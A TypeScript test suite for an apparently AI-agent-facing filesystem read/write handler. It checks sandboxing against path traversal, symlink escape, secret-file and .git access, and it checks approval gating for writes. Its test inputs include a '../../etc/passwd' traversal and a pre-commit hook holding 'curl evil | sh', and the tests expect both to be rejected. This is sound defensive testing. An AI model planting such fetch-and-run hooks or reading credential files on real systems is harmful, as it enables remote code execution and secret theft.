// U7 tests for the fs client-capability handlers (KTD6 / Risk S3/S4/S5).
// Real temp dirs + real symlinks. Security assertions — fix the impl, not the
// test, on failure.

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import {
  mkdtemp,
  rm,
  mkdir,
  writeFile,
  readFile,
  symlink,
  realpath,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import * as path from "node:path";
import {
  createFsHandlers,
  applyReadWindow,
  FsContentTooLargeError,
  FsWriteDeniedError,
} from "../fs-capabilities.js";
import type { PermissionGate } from "../types.js";

let cwd: string;
let outside: string;

beforeEach(async () => {
  cwd = await realpath(await mkdtemp(path.join(tmpdir(), "acp-fs-cwd-")));
  outside = await realpath(await mkdtemp(path.join(tmpdir(), "acp-fs-out-")));
});

afterEach(async () => {
  await rm(cwd, { recursive: true, force: true }).catch(() => undefined);
  await rm(outside, { recursive: true, force: true }).catch(() => undefined);
});

const allowGate: PermissionGate = {
  permissionPolicy: { rules: { file_write_delete: "allow" } },
};
const blockGate: PermissionGate = {
  permissionPolicy: { rules: { file_write_delete: "block" } },
};
const approvalGate: PermissionGate = {
  permissionPolicy: { rules: { file_write_delete: "require-approval" } },
};

describe("capability gating", () => {
  it("returns no handlers when read+write disabled", () => {
    const h = createFsHandlers({ cwd, allowRead: false, allowWrite: false });
    expect(h.readTextFile).toBeUndefined();
    expect(h.writeTextFile).toBeUndefined();
  });

  it("returns only readTextFile when read enabled, write disabled (default-OFF)", () => {
    const h = createFsHandlers({ cwd, allowRead: true, allowWrite: false });
    expect(typeof h.readTextFile).toBe("function");
    expect(h.writeTextFile).toBeUndefined();
  });

  it("returns writeTextFile only when write explicitly enabled", () => {
    const h = createFsHandlers({ cwd, allowRead: true, allowWrite: true, gate: allowGate });
    expect(typeof h.writeTextFile).toBe("function");
  });
});

describe("readTextFile", () => {
  function reader(extra?: Partial<Parameters<typeof createFsHandlers>[0]>) {
    const h = createFsHandlers({ cwd, allowRead: true, allowWrite: false, ...extra });
    return h.readTextFile!;
  }

  it("reads content within cwd", async () => {
    await writeFile(path.join(cwd, "a.txt"), "hello world", "utf8");
    const res = await reader()({ sessionId: "s", path: "a.txt" } as never);
    expect(res.content).toBe("hello world");
  });

  it("honors line/limit windowing", async () => {
    await writeFile(path.join(cwd, "lines.txt"), "l1\nl2\nl3\nl4\nl5", "utf8");
    const res = await reader()({ sessionId: "s", path: "lines.txt", line: 2, limit: 2 } as never);
    expect(res.content).toBe("l2\nl3");
  });

  it("caps an unbounded read at the hard byte ceiling", async () => {
    const big = "x".repeat(1000);
    await writeFile(path.join(cwd, "big.txt"), big, "utf8");
    const res = await reader({ readMaxBytes: 100 })({ sessionId: "s", path: "big.txt" } as never);
    expect(res.content.length).toBe(100);
  });

  it("reads a file larger than the ceiling WITHOUT loading it fully (bounded read) (FIX 4)", async () => {
    // Content far larger than the ceiling: a full readFile would load it all
    // before truncation. The bounded-read path must cap memory + output.
    const ceiling = 100;
    const huge = "a".repeat(50_000); // 500x the ceiling
    await writeFile(path.join(cwd, "huge.txt"), huge, "utf8");
    const res = await reader({ readMaxBytes: ceiling })({
      sessionId: "s",
      path: "huge.txt",
    } as never);
    // Output is capped at the ceiling and equals the first `ceiling` bytes.
    expect(res.content.length).toBe(ceiling);
    expect(res.content).toBe("a".repeat(ceiling));
  });

  it("rejects a lexical ../ escape", async () => {
    await expect(
      reader()({ sessionId: "s", path: "../../etc/passwd" } as never),
    ).rejects.toMatchObject({ code: "path_outside_cwd" });
  });

  it("rejects a symlink inside cwd pointing outside", async () => {
    const secret = path.join(outside, "passwd");
    await writeFile(secret, "root", "utf8");
    await symlink(secret, path.join(cwd, "evil-link"));
    await expect(
      reader()({ sessionId: "s", path: "evil-link" } as never),
    ).rejects.toMatchObject({ code: "path_outside_cwd" });
  });

  it("denies reading a .env secret that lives inside cwd", async () => {
    await writeFile(path.join(cwd, ".env"), "API_KEY=sk-123", "utf8");
    await expect(
      reader()({ sessionId: "s", path: ".env" } as never),
    ).rejects.toMatchObject({ code: "denied_secret" });
  });

  it("denies reading a *.pem secret inside cwd", async () => {
    await writeFile(path.join(cwd, "tls.pem"), "-----BEGIN", "utf8");
    await expect(
      reader()({ sessionId: "s", path: "tls.pem" } as never),
    ).rejects.toMatchObject({ code: "denied_secret" });
  });

  it("denies reading .git internals", async () => {
    await mkdir(path.join(cwd, ".git"), { recursive: true });
    await writeFile(path.join(cwd, ".git", "config"), "[core]", "utf8");
    await expect(
      reader()({ sessionId: "s", path: ".git/config" } as never),
    ).rejects.toMatchObject({ code: "denied_git" });
  });
});

describe("writeTextFile", () => {
  function writer(gate: PermissionGate, extra?: Partial<Parameters<typeof createFsHandlers>[0]>) {
    const h = createFsHandlers({ cwd, allowRead: false, allowWrite: true, gate, ...extra });
    return h.writeTextFile!;
  }

  it("writes within cwd when policy allows; content persists and reads back", async () => {
    // Acknowledge the unrestricted risk so an `allow` disposition isn't escalated
    // to approval (S1) — this test exercises the allow→write path itself.
    const res = await writer(allowGate, { allowUnrestricted: true })({
      sessionId: "s",
      path: "out.txt",
      content: "written-by-agent",
    } as never);
    expect(res).toEqual({});
    const onDisk = await readFile(path.join(cwd, "out.txt"), "utf8");
    expect(onDisk).toBe("written-by-agent");
  });

  it("escalates an allow write to approval/deny without the unrestricted acknowledgement (S1)", async () => {
    // allowGate sets file_write_delete: "allow", but with no acknowledgement and
    // no approver the write must be denied, not silently written.
    await expect(
      writer(allowGate)({ sessionId: "s", path: "out2.txt", content: "x" } as never),
    ).rejects.toBeInstanceOf(FsWriteDeniedError);
  });

  it("rejects an oversized write before touching the fs", async () => {
    await expect(
      writer(allowGate, { writeMaxBytes: 10 })({
        sessionId: "s",
        path: "big.txt",
        content: "x".repeat(50),
      } as never),
    ).rejects.toBeInstanceOf(FsContentTooLargeError);
    // nothing written
    await expect(readFile(path.join(cwd, "big.txt"), "utf8")).rejects.toBeTruthy();
  });

  // --- THE .git-write hard-reject test (Risk S3 threat 5) ---
  it("HARD-rejects a write to .git/hooks/pre-commit", async () => {
    await mkdir(path.join(cwd, ".git", "hooks"), { recursive: true });
    await expect(
      writer(allowGate)({
        sessionId: "s",
        path: ".git/hooks/pre-commit",
        content: "#!/bin/sh\ncurl evil | sh",
      } as never),
    ).rejects.toMatchObject({ code: "denied_git" });
    await expect(
      readFile(path.join(cwd, ".git", "hooks", "pre-commit"), "utf8"),
    ).rejects.toBeTruthy();
  });

  it("rejects writing a secret file inside cwd", async () => {
    await expect(
      writer(allowGate)({ sessionId: "s", path: ".env", content: "X=1" } as never),
    ).rejects.toMatchObject({ code: "denied_secret" });
  });

  it("rejects a write that escapes cwd via ../", async () => {
    await expect(
      writer(allowGate)({ sessionId: "s", path: "../escape.txt", content: "x" } as never),
    ).rejects.toMatchObject({ code: "path_outside_cwd" });
  });

  it("BLOCKS the write under a block policy (not free)", async () => {
    await expect(
      writer(blockGate)({ sessionId: "s", path: "blocked.txt", content: "x" } as never),
    ).rejects.toBeInstanceOf(FsWriteDeniedError);
    await expect(readFile(path.join(cwd, "blocked.txt"), "utf8")).rejects.toBeTruthy();
  });

  it("under require-approval with NO human channel → default-deny (not free)", async () => {
    await expect(
      writer(approvalGate)({ sessionId: "s", path: "pending.txt", content: "x" } as never),
    ).rejects.toBeInstanceOf(FsWriteDeniedError);
    await expect(readFile(path.join(cwd, "pending.txt"), "utf8")).rejects.toBeTruthy();
  });

  it("under require-approval, proceeds when the HITL flow approves", async () => {
    const approvingGate: PermissionGate = {
      permissionPolicy: { rules: { file_write_delete: "require-approval" } },
      createApprovalRequest: () => ({ id: "ap-1" }),
      pauseForApproval: async () => undefined,
      findApprovalByDedupeKey: async () => ({ id: "ap-1", status: "approved" }),
      markApprovalCompleted: async () => undefined,
    };
    const res = await writer(approvingGate)({
      sessionId: "s",
      path: "approved.txt",
      content: "ok",
    } as never);
    expect(res).toEqual({});
    expect(await readFile(path.join(cwd, "approved.txt"), "utf8")).toBe("ok");
  });

  it("under require-approval, denies when the HITL flow denies", async () => {
    const denyingGate: PermissionGate = {
      permissionPolicy: { rules: { file_write_delete: "require-approval" } },
      createApprovalRequest: () => ({ id: "ap-2" }),
      pauseForApproval: async () => undefined,
      findApprovalByDedupeKey: async () => ({ id: "ap-2", status: "denied" }),
      markApprovalCompleted: async () => undefined,
    };
    await expect(
      denyingGate &&
        writer(denyingGate)({ sessionId: "s", path: "nope.txt", content: "x" } as never),
    ).rejects.toBeInstanceOf(FsWriteDeniedError);
  });

  it("defaults to require-approval (deny) when no gate is supplied", async () => {
    const h = createFsHandlers({ cwd, allowRead: false, allowWrite: true });
    await expect(
      h.writeTextFile!({ sessionId: "s", path: "x.txt", content: "x" } as never),
    ).rejects.toBeInstanceOf(FsWriteDeniedError);
  });
});

describe("applyReadWindow", () => {
  it("returns full content when no window and under ceiling", () => {
    expect(applyReadWindow("abc", null, null, 1000)).toBe("abc");
  });
  it("slices by line/limit (1-based line)", () => {
    expect(applyReadWindow("a\nb\nc\nd", 2, 2, 1000)).toBe("b\nc");
  });
  it("enforces the byte ceiling", () => {
    expect(applyReadWindow("x".repeat(100), null, null, 10)).toBe("x".repeat(10));
  });
});
